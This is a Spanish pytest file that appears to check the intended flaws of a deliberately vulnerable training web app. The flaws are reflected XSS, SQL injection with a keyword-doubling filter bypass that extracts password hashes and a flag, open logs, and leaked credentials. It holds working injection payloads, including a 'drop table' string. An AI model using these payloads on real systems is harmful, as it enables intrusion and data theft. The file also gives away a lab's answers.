"""Pruebas del buscador, los registros y los documentos publicos.

Vigilan las FALLAS 12, 13, 14 y 16.

  uv run pytest pruebas/test_buscador.py -v
"""

import sqlite3

from conftest import poner_admin, poner_cliente


# --- Lo que debe funcionar ------------------------------------------------


def test_el_buscador_responde(cliente):
    respuesta = cliente.get("/contratos")
    assert respuesta.status_code == 200
    assert b"Consultar contrato" in respuesta.data


def test_el_buscador_encuentra_por_nombre(cliente):
    respuesta = cliente.get("/contratos?q=Gutenberg")
    assert respuesta.status_code == 200
    assert b"Gutenberg" in respuesta.data


def test_el_buscador_encuentra_por_bodega(cliente):
    respuesta = cliente.get("/contratos?q=CEN-07")
    assert respuesta.status_code == 200
    assert b"CEN-07" in respuesta.data


def test_el_buscador_sin_resultados(cliente):
    respuesta = cliente.get("/contratos?q=zzzznoexiste")
    assert respuesta.status_code == 200
    assert b"No se encontraron" in respuesta.data


def test_el_filtro_quita_select(cliente):
    """El filtro casero existe y quita la palabra."""
    import app as m

    assert "SELECT" not in m.filtrar("SELECT * FROM usuarios")
    assert "* FROM usuarios" in m.filtrar("SELECT * FROM usuarios")


# --- FALLA 13: el termino se refleja sin escapar -------------------------


def test_falla13_el_termino_se_refleja_crudo(cliente):
    """FALLA 13: el termino aparece en la pagina tal cual."""
    carga = "<b>busqueda-en-negritas</b>"
    respuesta = cliente.get("/contratos", query_string={"q": carga})
    assert respuesta.status_code == 200
    assert b"<b>busqueda-en-negritas</b>" in respuesta.data
    # El <b> sale sin escapar en el encabezado de resultados.
    assert b"Resultados para: <b>busqueda-en-negritas</b>" in respuesta.data


def test_falla13_admite_script(cliente):
    """FALLA 13: y admite una etiqueta script."""
    carga = "<script>alert(1)</script>"
    html = cliente.get("/contratos", query_string={"q": carga}).get_data(as_text=True)
    assert "<script>alert(1)</script>" in html


# --- FALLA 12: inyeccion SQL --------------------------------------------


def test_falla12_la_consulta_se_arma_pegando(cliente):
    """FALLA 12: una carga simple rompe la consulta y el error de SQLite se ve."""
    respuesta = cliente.get("/contratos", query_string={"q": "')"})
    assert respuesta.status_code == 200
    html = respuesta.get_data(as_text=True)
    assert "No se pudo completar la b" in html
    # El motor de la base dice exactamente que fallo.
    assert "unrecognized token" in html or "near" in html


def test_falla12_el_filtro_se_puede_evadir(cliente):
    """FALLA 12: el filtro quita una sola vez, asi que se evade repitiendo."""
    import app as m

    assert m.filtrar("UNIUNIONON") == "UNION"
    assert m.filtrar("SELSELECTECT") == "SELECT"


def test_falla12_union_se_ejecuta(cliente):
    """FALLA 12: un UNION armado para evadir el filtro saca los hashes."""
    # El filtro quita UNION, SELECT y -- una sola vez. Al escribirlos dobles,
    # queda uno de cada. Se cierra el parentesis, se une la tabla usuarios y
    # se comenta el resto de la consulta original.
    carga = ("%') UNIUNIONON SELSELECTECT usuario, hash, nombre, correo,"
             " 'a', 'b', 'c', 'd' FROM usuarios -- --")
    respuesta = cliente.get("/contratos", query_string={"q": carga})
    assert respuesta.status_code == 200
    html = respuesta.get_data(as_text=True)
    assert "21232f297a57a5a743894a0e4a801fc3" in html or "7f9869da81b4208c62cb9ed03c435921" in html


def test_falla12_las_comillas_no_se_filtran(cliente):
    """FALLA 12: el filtro no toca las comillas ni el punto y coma."""
    import app as m

    assert "'" in m.filtrar("' OR '1'='1")
    assert ";" in m.filtrar("x'; drop table usuarios;--")


# --- FALLA 14: registros abiertos ---------------------------------------


def test_falla14_registros_sin_sesion(cliente):
    """FALLA 14: la bitacora de trafico se ve sin credenciales."""
    respuesta = cliente.get("/registros")
    assert respuesta.status_code == 200
    assert b"Registros del sistema" in respuesta.data


def test_falla14_registros_muestra_el_trafico(cliente):
    """FALLA 14: y muestra las peticiones de quien haya entrado."""
    cliente.get("/bodegas")
    cliente.get("/contratos?q=prueba")
    html = cliente.get("/registros").get_data(as_text=True)
    assert "/bodegas" in html
    assert "/contratos" in html


def test_falla14_registros_muestra_los_intentos_de_login(cliente):
    """FALLA 14: con los usuarios que se probaron."""
    cliente.post("/login", data={"usuario": "admin", "clave": "mala"})
    cliente.post("/login", data={"usuario": "fantasma", "clave": "x"})
    html = cliente.get("/registros").get_data(as_text=True)
    assert "admin" in html
    assert "fantasma" in html
    assert "clave-mala" in html


def test_falla14_registros_delata_a_quien_prueba(cliente):
    """FALLA 14: y cual fue el usuario correcto, con resultado ok."""
    cliente.post("/login", data={"usuario": "soporte", "clave": "ccr2014"})
    html = cliente.get("/registros").get_data(as_text=True)
    assert "soporte" in html
    assert "ok" in html


# --- FALLA 16: documentos publicos / OSINT -----------------------------


def test_falla16_el_aviso_de_privacidad_esta_en_el_sitio(cliente):
    """FALLA 16: el aviso publica el correo de privacidad."""
    respuesta = cliente.get("/publico/01-aviso-privacidad")
    assert respuesta.status_code == 200
    assert b"privacidad@ccr-almacenes.example" in respuesta.data


def test_falla16_la_vacante_nombra_el_sistema(cliente):
    respuesta = cliente.get("/publico/02-vacante")
    assert respuesta.status_code == 200
    assert b"CCR-Bodegas v2" in respuesta.data


def test_falla16_la_ficha_da_los_contactos(cliente):
    respuesta = cliente.get("/publico/03-ficha-dominio")
    assert respuesta.status_code == 200
    assert b"soporte@ccr-almacenes.example" in respuesta.data
    assert b"ccr-bodegas.example" in respuesta.data


def test_falla16_el_repo_trae_las_credenciales(cliente):
    """FALLA 16: y el respaldo del codigo trae usuario, clave y la ruta del panel."""
    respuesta = cliente.get("/publico/04-repo")
    assert respuesta.status_code == 200
    html = respuesta.get_data(as_text=True)
    assert "ccr2014" in html
    assert "soporte" in html
    assert "/admin-viejo" in html


def test_falla16_el_indice_lista_los_documentos(cliente):
    respuesta = cliente.get("/publico/")
    assert respuesta.status_code == 200
    assert b"Aviso de privacidad" in respuesta.data
    assert b"Bolsa de trabajo" in respuesta.data


def test_falla16_los_documentos_estan_enlazados_desde_el_pie(cliente):
    html = cliente.get("/").get_data(as_text=True)
    assert "/publico/" in html


# --- Flag de FALLA 12 -------------------------------------------------------


def test_falla12_flag_via_union(cliente):
    """FALLA 12: el UNION SELECT extrae el flag de la tabla secretos."""
    # El bypass del filtro: UNIUNIONON -> UNION, SELSELECTECT -> SELECT,
    # -- -- -> (espacio)-- que comenta el resto de la consulta original.
    carga = ("%') UNIUNIONON SELSELECTECT valor,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
             " FROM secretos-- --")
    html = cliente.get("/contratos", query_string={"q": carga}).get_data(as_text=True)
    assert "CCR{union_select_ok}" in html
